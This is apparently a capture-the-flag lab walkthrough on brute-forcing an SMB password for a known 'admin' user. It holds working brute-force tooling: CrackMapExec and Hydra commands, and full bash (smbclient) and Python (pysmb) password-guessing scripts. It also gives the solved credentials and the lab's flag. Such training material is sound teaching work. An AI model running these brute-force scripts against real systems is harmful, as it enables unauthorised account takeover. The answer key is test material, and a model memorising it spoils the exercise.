# Lab 3.3: SMB Single User Brute Force

## Learning Objectives
- Understand automated brute force attacks against SMB
- Use modern tools that support SMBv2/v3 (crackmapexec, smbclient scripts)
- Perform password brute forcing for known usernames
- Capture the flag

## What is SMB Brute Forcing?

SMB brute forcing is the process of systematically testing multiple password combinations against a known username to discover valid credentials. This is a common attack technique used when usernames are known or enumerated.

### Important Note About SMB Versions

**Modern Samba servers use SMBv2/v3 by default**, which many older brute force tools do not support:
- **Hydra**: Only supports SMBv1 (deprecated and disabled by default)
- **CrackMapExec**: Supports SMBv2/v3 (recommended)
- **smbclient**: Supports all SMB versions (can be scripted)

This lab uses modern SMB protocols, so we'll use tools that support SMBv2/v3.

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting brute force.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

   **Expected output:**
   ```
   PORT    STATE SERVICE
   445/tcp open  microsoft-ds
   ```

### Step 2: Create Password Wordlist

Create a wordlist file containing common passwords to test.

**Detailed Steps:**

1. **Create wordlist with common passwords:**
   ```bash
   echo -e "password\nadmin\nadmin123\nqwerty\n123456\nPassword123\npassword123\nletmein\nwelcome" > wordlist.txt
   ```

2. **Verify wordlist was created:**
   ```bash
   cat wordlist.txt
   ```

   **Expected output:**
   ```
   password
   admin
   admin123
   qwerty
   123456
   Password123
   password123
   letmein
   welcome
   ```

3. **Alternative: Use existing wordlist:**
   ```bash
   # Use common password wordlist (if available)
   cp /usr/share/wordlists/rockyou.txt wordlist.txt
   
   # Or use smaller common passwords list
   cp /usr/share/wordlists/fasttrack.txt wordlist.txt
   ```

### Step 3: Brute Force with CrackMapExec (Recommended)

CrackMapExec is a modern tool that supports SMBv2/v3 and is the recommended approach for this lab.

**Detailed Steps:**

1. **Verify CrackMapExec is installed:**
   ```bash
   which crackmapexec
   crackmapexec --version
   ```

   **If not installed:**
   ```bash
   # Install via pip (if available)
   pip3 install crackmapexec
   
   # Or install via apt (Kali Linux)
   sudo apt update && sudo apt install crackmapexec
   ```

2. **Run CrackMapExec brute force:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p wordlist.txt
   ```
   
   Replace `<target_ip>` with your actual target IP

   **Command breakdown:**
   - `crackmapexec`: Modern penetration testing tool
   - `smb`: Protocol to test (SMB)
   - `<target_ip>`: Target IP address
   - `-u admin`: Username to test
   - `-p wordlist.txt`: Password wordlist file

3. **Expected output:**
   ```
   SMB         <target_ip>      445    TARGET-HOST      [*] Windows 10.0 Build 19041 x64 (name:TARGET-HOST) (domain:WORKGROUP) (signing:False) (SMBv1:False)
   SMB         <target_ip>      445    TARGET-HOST      [+] WORKGROUP\admin:qwerty
   ```

   **Key information:**
   - `[+]` indicates successful authentication
   - `WORKGROUP\admin:qwerty` shows the valid credentials
   - Username: `admin`
   - Password: `qwerty`

4. **Alternative: Test specific share:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p wordlist.txt --shares
   ```

### Step 4: Brute Force with smbclient Script (Alternative Method)

If CrackMapExec is not available, you can use a bash script with `smbclient` to brute force passwords.

**Detailed Steps:**

1. **Create brute force script:**
   ```bash
   cat > smb_brute.sh << 'EOF'
   #!/bin/bash
   TARGET="$1"
   USERNAME="$2"
   WORDLIST="$3"
   SHARE="private"
   
   if [ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$WORDLIST" ]; then
       echo "Usage: $0 <target_ip> <username> <wordlist>"
       exit 1
   fi
   
   while read password; do
       echo "[*] Trying password: $password"
       if smbclient "//$TARGET/$SHARE" -U "$USERNAME%$password" -c "ls" > /dev/null 2>&1; then
           echo "[+] SUCCESS! Username: $USERNAME Password: $password"
           exit 0
       fi
   done < "$WORDLIST"
   
   echo "[-] No valid password found in wordlist"
   exit 1
   EOF
   
   chmod +x smb_brute.sh
   ```

2. **Run the brute force script:**
   ```bash
   ./smb_brute.sh <target_ip> admin wordlist.txt
   ```

   Replace `<target_ip>` with your actual target IP.

3. **Expected output:**
   ```
   [*] Trying password: password
   [*] Trying password: admin
   [*] Trying password: admin123
   [*] Trying password: qwerty
   [+] SUCCESS! Username: admin Password: qwerty
   ```

### Step 5: Connect and Retrieve Flag

Use the discovered password to connect to the SMB share and retrieve the flag.

**Detailed Steps:**

1. **Connect with discovered credentials:**
   ```bash
   smbclient //<target_ip>/private -U admin%qwerty
   ```
   
   Replace `<target_ip>` with your actual target IP and `qwerty` with the password discovered.

2. **Expected successful connection:**
   ```
   Try "help" for a list of possible commands.
   smb: \>
   ```

3. **List files in the share:**
   ```bash
   ls
   ```

   **Expected output:**
   ```
     .                                   D        0  Mon Jan 15 10:00:00 2024
     ..                                  D        0  Mon Jan 15 10:00:00 2024
     flag.txt                            A       45  Mon Jan 15 10:00:00 2024
   
                   524288 blocks of size 1024. 524288 blocks available
   ```

4. **Download the flag:**
   ```bash
   get flag.txt
   ```

5. **Exit and view:**
   ```bash
   exit
   cat flag.txt
   ```

   **Expected output:**
   ```
   OCR{smb_s1ngl3_brut3}
   ```

### Step 6: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{smb_s1ngl3_brut3}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

## Alternative Tools and Methods

### Method 1: CrackMapExec (Best for Modern SMB)

```bash
# Basic brute force
crackmapexec smb <target_ip> -u admin -p wordlist.txt

# With share enumeration
crackmapexec smb <target_ip> -u admin -p wordlist.txt --shares

# Save successful credentials
crackmapexec smb <target_ip> -u admin -p wordlist.txt --shares | tee results.txt
```

### Method 2: smbclient Script (Universal)

The bash script method works with all SMB versions and doesn't require additional tools.

### Method 3: Python Script with pysmb

```python
#!/usr/bin/env python3
from smb.SMBConnection import SMBConnection
import sys

target = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]

with open(wordlist, 'r') as f:
    for password in f:
        password = password.strip()
        try:
            conn = SMBConnection(username, password, '', '', use_ntlm_v2=True)
            if conn.connect(target, 445):
                print(f"[+] SUCCESS! Username: {username} Password: {password}")
                conn.close()
                sys.exit(0)
        except:
            pass
    print("[-] No valid password found")
```

### Method 4: Using Hydra (Requires SMBv1 - Not Recommended)

**Note**: Hydra only supports SMBv1, which is deprecated and disabled by default in modern Samba. If you need to use Hydra, you would need to enable SMBv1 in the Samba configuration, but this is not recommended for security reasons.

If SMBv1 is enabled, you could use:
```bash
hydra -l admin -P wordlist.txt smb://<target_ip>
```

However, **this lab uses modern SMB protocols, so Hydra will not work**.

## Troubleshooting

### CrackMapExec Not Found

**Solution:**
```bash
# Install via pip
pip3 install crackmapexec

# Or on Kali Linux
sudo apt update && sudo apt install crackmapexec
```

### "No valid password found"

**Possible causes:**
- Password not in wordlist
- Wordlist file path incorrect
- Target IP incorrect
- SMB service not running

**Solutions:**
- Verify wordlist contains common passwords
- Check wordlist file path: `ls -la wordlist.txt`
- Verify target IP: `ping <target_ip>`
- Check SMB service: `nmap -p 445 <target_ip>`

### Connection Timeout

**Solutions:**
- Verify network connectivity: `ping <target_ip>`
- Check if SMB port is open: `nmap -p 445 <target_ip>`
- Verify you're connected to VPN (if required)

### SMB Protocol Errors

**If you see SMB protocol errors:**
- Ensure you're using tools that support SMBv2/v3 (CrackMapExec, smbclient)
- Do not use Hydra (only supports SMBv1)

## Success Criteria

- ✅ Verified target IP and SMB service accessibility
- ✅ Created password wordlist with common passwords
- ✅ Ran brute force attack using CrackMapExec or smbclient script
- ✅ Discovered valid password for admin user
- ✅ Successfully connected to private share with discovered credentials
- ✅ Listed files and located flag.txt
- ✅ Downloaded flag using `get` command
- ✅ Verified flag format is correct: `OCR{...}`

## Key Learning Points

- **Modern SMB Protocols**: SMBv2/v3 are standard; many older tools don't support them
- **Tool Selection**: Choose tools that support the protocol version in use
- **Automation**: Brute force tools automate repetitive password testing
- **Wordlist Quality**: Better wordlists increase success chances
- **Credential Verification**: Always verify discovered credentials by connecting manually

## Common Mistakes

- ❌ Using Hydra (only supports SMBv1, won't work with modern SMB)
- ❌ Wordlist too small or missing common passwords
- ❌ Not specifying correct target IP
- ❌ Using wrong tool syntax
- ❌ Not verifying discovered credentials

## Hints

1. Username: `admin`
2. Use `crackmapexec smb <target_ip> -u admin -p wordlist.txt`
3. Or use the smbclient script method
4. Password is a common keyboard pattern
5. The password is in most common password wordlists
